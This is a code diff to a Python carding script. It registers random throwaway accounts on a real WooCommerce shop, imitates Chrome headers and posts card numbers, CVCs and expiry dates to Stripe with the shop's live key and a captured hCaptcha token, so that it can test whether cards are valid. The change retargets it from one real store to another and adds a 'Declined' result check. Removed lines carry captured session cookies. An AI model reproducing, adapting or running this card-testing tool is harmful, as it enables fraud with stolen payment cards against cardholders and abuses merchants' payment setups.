@@ -11,7 +11,11 @@ print_lock = Lock()
 def generate_random_account():
     return ''.join(random.choices(string.ascii_lowercase, k=10)) + ''.join(random.choices(string.digits, k=4)) + '@yahoo.com'
 
+def generate_username():
+    return ''.join(random.choices(string.ascii_lowercase, k=2)) + ''.join(random.choices(string.digits, k=3))
+
 acc = generate_random_account()
+user = generate_username()
 
 
 def Tele(ccx):
@@ -30,8 +34,8 @@ def Tele(ccx):
         'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
         'cache-control': 'max-age=0',
         'priority': 'u=0, i',
-        'referer': 'https://3dprintedprops.com/my-account/',
-        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
+        'referer': 'https://liquidlemn.com/my-account/',
+        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
         'sec-fetch-dest': 'document',
@@ -39,24 +43,22 @@ def Tele(ccx):
         'sec-fetch-site': 'same-origin',
         'sec-fetch-user': '?1',
         'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
-        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F136.0.0.0%20Safari%2F537.36; __stripe_mid=a5c7f57a-d956-4d28-8095-c8c7a6944acc53ba43; __stripe_sid=73b25042-9635-4ec3-b0c3-48561d986b456d9887; wordpress_test_cookie=WP%20Cookie%20check; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2F3dprintedprops.com%2Fmy-account%2F',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
     }
 
-    response = requests.get('https://3dprintedprops.com/my-account/', headers=headers)
+    response = requests.get('https://liquidlemn.com/my-account/', headers=headers)
 
-    nonce = re.search(r'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="([^*]+)" /><input type="hidden"', response.text).group(1)
-    # nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text).group(1)
+    nonce = re.search(r'"woocommerce-register-nonce" name="woocommerce-register-nonce" value="([^*]+)" /><input type="hidden" name="_wp_http_referer" value="/my-account/"', response.text).group(1)
 
     headers = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
         'cache-control': 'max-age=0',
         'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://3dprintedprops.com',
+        'origin': 'https://liquidlemn.com',
         'priority': 'u=0, i',
-        'referer': 'https://3dprintedprops.com/my-account/',
-        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
+        'referer': 'https://liquidlemn.com/my-account/',
+        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
         'sec-fetch-dest': 'document',
@@ -64,8 +66,7 @@ def Tele(ccx):
         'sec-fetch-site': 'same-origin',
         'sec-fetch-user': '?1',
         'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
-        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F136.0.0.0%20Safari%2F537.36; __stripe_mid=a5c7f57a-d956-4d28-8095-c8c7a6944acc53ba43; __stripe_sid=73b25042-9635-4ec3-b0c3-48561d986b456d9887; wordpress_test_cookie=WP%20Cookie%20check; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2F3dprintedprops.com%2Fmy-account%2F',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
     }
 
     data = {
@@ -81,24 +82,24 @@ def Tele(ccx):
         'wc_order_attribution_utm_source_platform': '(none)',
         'wc_order_attribution_utm_creative_format': '(none)',
         'wc_order_attribution_utm_marketing_tactic': '(none)',
-        'wc_order_attribution_session_entry': 'https://3dprintedprops.com/',
-        'wc_order_attribution_session_start_time': '2025-05-29 08:33:06',
-        'wc_order_attribution_session_pages': '10',
+        'wc_order_attribution_session_entry': 'https://liquidlemn.com/my-account/',
+        'wc_order_attribution_session_start_time': '2025-08-03 06:42:34',
+        'wc_order_attribution_session_pages': '3',
         'wc_order_attribution_session_count': '1',
-        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         'woocommerce-register-nonce': nonce,
         '_wp_http_referer': '/my-account/',
         'register': 'Register',
     }
 
-    response = requests.post('https://3dprintedprops.com/my-account/', headers=headers, data=data)
+    response = requests.post('https://liquidlemn.com/my-account/', headers=headers, data=data)
 
     headers = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
         'priority': 'u=0, i',
-        'referer': 'https://3dprintedprops.com/my-account/',
-        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
+        'referer': 'https://liquidlemn.com/my-account/',
+        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
         'sec-fetch-dest': 'document',
@@ -106,18 +107,17 @@ def Tele(ccx):
         'sec-fetch-site': 'same-origin',
         'sec-fetch-user': '?1',
         'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
-        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F136.0.0.0%20Safari%2F537.36; __stripe_mid=a5c7f57a-d956-4d28-8095-c8c7a6944acc53ba43; __stripe_sid=73b25042-9635-4ec3-b0c3-48561d986b456d9887; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7c8fd66723dda58e67a3ffadfab8ca45=noemail-4692%7C1749721214%7CLFM1CvsXMNxTa8MWGwEzgJf6dEAco2lnsnSsV3g1AwD%7C6efb17f4415685ec36e25b7a163654ce36324f91519dc02f7f82188fdc1aa015; sbjs_session=pgs%3D22%7C%7C%7Ccpg%3Dhttps%3A%2F%2F3dprintedprops.com%2Fmy-account%2Fedit-address%2F',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
     }
 
-    response = requests.get('https://3dprintedprops.com/my-account/payment-methods/', headers=headers)
+    response = requests.get('https://liquidlemn.com/my-account/payment-methods/', headers=headers)
 
     headers = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
         'priority': 'u=0, i',
-        'referer': 'https://3dprintedprops.com/my-account/payment-methods/',
-        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
+        'referer': 'https://liquidlemn.com/my-account/payment-methods/',
+        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
         'sec-fetch-dest': 'document',
@@ -125,13 +125,12 @@ def Tele(ccx):
         'sec-fetch-site': 'same-origin',
         'sec-fetch-user': '?1',
         'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
-        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F136.0.0.0%20Safari%2F537.36; __stripe_mid=a5c7f57a-d956-4d28-8095-c8c7a6944acc53ba43; __stripe_sid=73b25042-9635-4ec3-b0c3-48561d986b456d9887; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7c8fd66723dda58e67a3ffadfab8ca45=noemail-4692%7C1749721214%7CLFM1CvsXMNxTa8MWGwEzgJf6dEAco2lnsnSsV3g1AwD%7C6efb17f4415685ec36e25b7a163654ce36324f91519dc02f7f82188fdc1aa015; sbjs_session=pgs%3D23%7C%7C%7Ccpg%3Dhttps%3A%2F%2F3dprintedprops.com%2Fmy-account%2Fpayment-methods%2F',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
     }
 
-    response = requests.get('https://3dprintedprops.com/my-account/add-payment-method/', headers=headers)
+    response = requests.get('https://liquidlemn.com/my-account/add-payment-method/', headers=headers)
 
-    nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text).group(1)
+    ajax_nonce = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text).group(1)
 
     headers = {
         'accept': 'application/json',
@@ -140,18 +139,26 @@ def Tele(ccx):
         'origin': 'https://js.stripe.com',
         'priority': 'u=1, i',
         'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
+        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-platform': '"Windows"',
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
     }
 
-    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=87121&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2Fba4e3767a2%3B+stripe-js-v3%2Fba4e3767a2%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2F3dprintedprops.com&time_on_page=62862&client_attribution_metadata[client_session_id]=c4fc161d-5ba8-40b3-a882-b0155b9f224e&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=1f1e2e34-b66f-4f87-b974-e386ae6df3112e2fed&muid=a5c7f57a-d956-4d28-8095-c8c7a6944acc53ba43&sid=73b25042-9635-4ec3-b0c3-48561d986b456d9887&key=pk_live_51GiQFjLBjXqlell7lfU5IpkR2WZs6MwM87yxrXYvlt27hZupCjijGdsGbtnv2UAZ3tjnSKCuJ77Pub5opEuilU4Z00W20xrwRS&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzQ4NTEyMTc4LCJjZGF0YSI6Ik9zMUpYMjB0a1Y5VU10RG1GWFZWalMyb2QzUEdpZGphZlFhRGZGWEtVN0EwZnY4ZkNmMEpXYjFZL2wzWWYwcWluTGc0V091OEtLWkVnclcySUJ0WXR6SmJvRXA0bVdPQkY3OFVTbFdKNTRKR29YZ1FFSVBSeFdJakJlVU1WamJFUXNTeHdZdWV2WDIvdFNLR2lnSlNScHkxdGVYb0puUjNSUnQzMklaQ3oyRCtOZWQ4LzJZSzhqNlFzRFFHTnhIU29nWjhiL3dBRldlMFRWRlIiLCJwYXNza2V5IjoiZTJndUhaZmUzNEIyenpTRGFQZm9MMlRrcVhxL0txd0R4YWJSNXErTDFnRDVJN3RIb09UeFVycmFOZEpVTDhtYjcwdkpzdzJrdkFnNXg5ZTgwaWNPRlJGQ3RvT0REamNLUUtYOTdrZUNiNUFnaVRrcURNUVFZWXFXQkc5amNDSFdSY0xSU2FTVUd3c1V5Q2FXcHlIc1ZIMXZWQWE4OWlLSTRvb2Z1Vjd3SzI4OU5YNWdaYkk2QVB4OEJJYURmcVlKdHlHdTJ0aHlKVGZIUzNjYXI3TFRoelFxV0Z4TlFiY3d3ZzJVVFNQS2JwZGFidmVuT1pUM2EvbFBTdDk0TWpQY3RUVVAvbWx5QkZWeHFsbXN5RHFoVXBUTDhkN090YTYwMHp5QUVRRHp0dk54SHphSEdJQmNTNWN4T1pJNGV1bU5SWFhiTXBZQTNNdjA5YzIzNTJ5bThyZk9mYklBK01KUFYwREJtcUlGNzA5Wk1BS09SbE83MDJsTDk5SHU5d2JwaGJhVTB3TXBMWUlqUzJoOHorSXNabGR5c0IyTy9ocFd3M2xHeHZIZUpRNmxudW1JemhYYXVKdnVZbGNoNFpXY2pNV2lHQWJSMzhpU0JTMmhGK29vSGZvV29TZkZtdkt3VzF3aEI5d2Y1R2lDR0QrNGhDL1lQSWdwRXpHejVSYk1NQWpyTlpuNjVOVGpwRlkwc0pXMncyREhkNDdTMk05bHkyR29EZXVPOEc0RU5WR2pFK3lUT1k5dThnWVZ0SExRMDFmZk03a1QwV3FlQ0xLdHV3WVVxUC9HNWpmanNjb0VLdEtqUjVPMVFkRkRET0VtQzN1ZmlXaGRDNjBMaDNkT2wwaGg5ZStIMk1RcXR4cmp6MEtNd2o1Z0NZdWNOOTBZRWZsMUhFMnZmQTFINWpiMU4yNlRieFlvamJOZk9JcDJ1S2NCL25VSnJoVlZhMzh1YnoxMWV3eWwzWUQvdnEzVFd0VXB2blFWYXN2ZUJjNVh5SVBOb0hQUklNMEFCWVRtMFdua0kwNHJWR0RTdlg4TGZjdkJURXJhUE12RkJ4YjB3by9QMis0MTRLOGs1MkdQY01waUhleXB3cHBMWmg4K1RFMFZ3bmdKc2VrUFdSMm5DUStLTURGd1p4TUd6TnNFUnFoNENpdGpKUDU4NytOS0lwT1VnYWc5TjFON0Rmc3M4aUY5UW9XeWRiUFllN09tYzFES0daM1RqTnQ1OExBQ01WaTBpK1JoMVloMk1sa3VFcFBQd2JQVVBsL29BZ1hSNkJUNE0wSlJld3VoRUwzWTA2WlNNNU9DOUVZenZhWmRtSWRnbWlia25HR2ptNVJ6L1dRZ25kSm93dnZjTkx6cS83K0FqQU9KQThqMmh0blFsdjc3ZVRPUnZOVU1FeUxtYUE1V3F6WkV5U3M1eGp6UnZnT2xHRFdRN09xRjNjd0ZTYmNEbFVuTEpuZ25TRlcxT21vSWNaNWptcEhPU0VGS1crZzlLakhZd3NoSXRwRHVJTEFPZU15aEFhc0RBQVM1b2ZGdHRwbldYODc1cHFwTmdtVUgyN1pGUTRVdW1kdHVuSVluY1RSbk14emRnMDFwOG5IZ0RFNFNMbzFGWnlxVWNHWXV3ZXNXdDZIZTFydVJER3NIRmErbU9ockxqNC9OR1JWWFZwYUh6dUl6NWJUdTdTY0M1aVFJUEQwVzVxYUNrYW14ZEVMVHlWVmRjRTRYMVRSaWlDemd5K1dYV1BXSE5EaWtlb3NReDZ2SWl1QzViUlBqT2xUd3RsWmVRdUYxeExIM2t2UXdXT2RXYjJCYzN1ZTZJVjhqdkhwaWhmdEFzc0IzVENtWnJCcFlxazJwR1ZPWTlqNE1PQWIwOFVIem15QW56N0VFMmdlVnVUTFNCb29Jb1RFRzVZL25rSkRHSzlrQXdCajI5SXlMaVFUS3BMd0xEV3ZHZkh0c0xyR0VNQUthYmpFOXQzanpkMWJCdUFRdGZQRSs3azM4bE9ZbGpKMzAxZDZqVjFRSGE1cUc0RFQ4a1RuRHErUHlackxzbjUzWWtRQ0ZiR2ZiQjFsVHgzWTY3SHVBRUlUS2ZJYnpUUVV2SytScGJmbjNMcVNQaTd4QXB1eklKVUhiTVFTMkI1cUFPcHVoTzBtUVovcHlBekhBb1NVPSIsImtyIjoiNDMyNDc1ZGIiLCJzaGFyZF9pZCI6MjU5MTg5MzU5fQ.2OOglzI9fNsGZ-aZe_m9UP26Np_nVAMvQSEF__ABoc0'
+    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=87121&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2F54a85a778c%3B+stripe-js-v3%2F54a85a778c%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fliquidlemn.com&time_on_page=18504&client_attribution_metadata[client_session_id]=bfdfea49-3eb3-4dac-9c44-937eac306a40&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=406a9dc8-4c6c-4304-8d4b-c1c0bc3f4977&guid=e20a3a0f-19b2-46de-a09b-f184ba215a793bf521&muid=d4472621-e458-4fd1-80c3-455fa2618fb0150fa3&sid=116376d9-54e7-4f0a-83fd-4dce8da1fe14c2f96d&key=pk_live_51QUUFhJDWkDIXZhZKyMPOSgGVEF0zX0g7s5AtODNZQVu3LQGbhT2xLx2ZXn6LcLVUa02bu6aJ6jvLkqewPRKGeeo0057gpwhlL&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzU0MjA2MDM5LCJjZGF0YSI6IjV4WHk4WXB0WVJORG9kUms4SWE2WGRncklUeEpHVWNxNVN5RWJFS3RYTVQzb3hFVzJvUzdXQ1B2T29kSFdTcUJwY3BwNGhwYXhoQjJiaEFtcGZ4RVc1ejJmbTM1U3lEVDVJZlJmM2tJVzQwTGRCWkFaN0lBRjNrd25DVVBvcDJaN3k3RlpKSnhhWjZRSUZlalJYZXJQeW1Dem56M2owOGppZWV5RVdsZm51MzRNeW5Md0VhMmZQVEQ3TGlkRm1LVWcwWmYvZk1qMDhKRG01WFAiLCJwYXNza2V5IjoieFNndE1SRm1ML1NvbkdpYlYxcWZrUEFVMGtOK0NtcEZPYUVMMWFEV0VxMjlIL0JpYXdJeTRESTc3UTRoenhjeVhlZkZicitpcG12WG1ibXpiYkFyVlI3dU9iTHk4OGlhOEdxdXViK2VabjRWKzNqS3AzZUswV0FpYkxYVFJQQ1Zla2V0NnJLeHdURlJFQXBYaXpVTUxkZzFHRFJYNlVYQ3BncDMyUjB4b3pwUkIvcFNqNlVqMHgrYzBCd0hnNkU5Q2V3cG9DZDVENko2ejFrazZGRjhzOEJwbEtwaU9kTmVLeWNBN0pLOFhNdlVKcG9rWWFnUTBDQndnTnl6aHJpSEgrVXBxOXpPLzZqMXJDUFdUTFZHUDBCcWROd0RVZkdMU1BOUUc4RHBZYnRNb3B5QyttT1lFbFZkSXNhWUFOMG9CajZyRFdaUmc0VkNqa203aUw4QjJzRkJGSTBNWHppZmp2cmc2ZVRtSmJuRlQ3VU50a2NnNktYalVvY1A0K3Y4V1NQcXNxU1UzWFliRmh5VnZzVzZGSlFEeHJoallIVnlFZDY3OSswMTB6OUFWbVYvVU42N2FvN09IVE1rZFZUN1RqUXh5c3JSc2JSL05URG5ScWQ0TkZ3cFR6YmhBcXRBcGRsKzJzODVjVVFzc0JSU0NhWFpZT1hnNmZjdUdBcUE3U0diQUFIQkNhN3hRb0thTTM0OTkzYzZjZ08xbVdTM2dVVVpqVjBtYjl5ZkFJMks0ZnUwYnJDUTRNSGhyV1c1K0FaMU9VRUovTHpvUmNSODh6MWxVOGlETG1LUkJJUTVmK2pBSTAyLzVQenFRL1Fod2ZsQjArMmdDeGxIdHhaMHZUb1hFTmwxVkRVeUZha0RUUVA1bEJGM3BIODkzU3hoclR3N0xCS3pTYSs5ZUptcFdZZGNXTXlsOGZmSmpia2Y2RHowYzA0bHNNdUFDN0lHYzF1M1BaYWd3czNqeUZ3R0RHelJzVFFzeDhaZmsybDJvbS9yUnc3L1hXUS9mRXBNNE9kdjFyUXJ5dzQ5eUJGUnJZb0ZaQkZFaU5ENVJXR2NRSlhFSEd5cEVFekd3SkxkWmtIOEtZMGNMZEdCSjhESURsdm1haGc4VVpUemY2dU8wYmEyT2pkb3h5Q2ZtcUprd2F0UEJSYWU0RThoTk14Z1J5UFUwMDFoV0N2dW52L1RPQ3RvajNJYUZTcEpxUVk1Sm0rcEdvR1o4b0JyVnZMelpDVnUwWngxSWd1dnZlWTBSV0tkOTN4V3lybFFvTHFEZ3pWTmJibDBGOUxxQUVMTWh4eTdVdUN4RjlwOFdaRUJyMkQ4NVJCRzZnbE10ZU1WMWFOKytuWlhTRlY0bmlyZVhsZEJBSHFybndrYnpKM0JwcmhEZlp3VnVRWU1LNWt1Ni9ycnlJeitoN1JtV3NzL2YzNlFtU0pvYjdiZzdTMys5eEdZVkZsRGFjSXRGNHNnbG5vQnRycUxoWFVKUmpDamtNNHA0T3lET01TaExYUWFuMFdhK3FWR1ZSa3JHMnd3L3B4VENWMEhTcmpKOG5EZXFFQkV4ZnZnZG1qNHA1NEFZdDhDeWpRc1FvRnY2UldYa2hNbXNKeDd0TXp0QU1URkQ5ZmMvSVdnZlJTVVJiZlFYNE9OVW04SkFUeWcyQkRmUWF2cUowa2UyYWJyY2pOeUpWM1dTczBiMTJLamV5MEZnYmp4ZkNoTWFWKzRmKzY5alkrbUlwV1ZwQWdNYkFJTWlvL2ozakVmVUsvS3l5bWVLVEFDNThoV1UrWEp6OXJJa0JvUlNYQWhXdU5GbTRWdjNqckVOWmtXSlNxdkVKMW5QaEdvODcvZFlxcDVjMGNhbzVmTlkvTnUvUlR4bUlxL3JhYTJlZXRaaFBOUFB5UnltNnJhaVk1dldLOE9ubEJkdjZEVHZxZUsrVWUxL1FDTE9wRXBGZDY4L2tiVW5LU2RzRzk1ZmxTNXVtQkFFVkg5dW44Zk43a2J6SFJVUVpJK3lSZ3A5RTJDdVpxaG1FeWVwTnJaditFL2oxbUQ5SzUzb1FySmRNd3g3TjgrOEpUVEdXRVV6QmszdkJQeUNDdGF4NUtxOHE3NzZUbEs2RUExRE5FR3hYc0g4RDgxWWpUMkVxY2dQRG1SWW1KSENQUUxBWHMvYkRvdGs1Rno3M05wcTZtdG5SaW5Nd3J4NTFHWjFYVE91bXE0NERlT1FkSndzTkRjeW5kelJJTUtlTFdGR25MSFpqZ1djWjYwaE14UDV2dkVBQXVscWh2SjBFVjMzanU2WVhjNEYxYXB2SFFoblltOC9BcGh4U0ZRalpjOUlxZ25XcE4zUzlkbHVrVEc3RGhOZlZLRnV3djhVUEU9Iiwia3IiOiI0ODgzNjA4YSIsInNoYXJkX2lkIjoyNTkxODkzNTl9.IuhWYjqlma14utMu4slG0R_mTzfOtpyN2AHiyXbdXag'
 
     response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+
+    data1 = response.json()
+
+    if "id" in data1 and data1["id"]:
+        pm = data1["id"]
+        # proceed with pm
+    else:
+        return "Card is Declined (Expired)"
 
     pm = response.json()["id"]
 
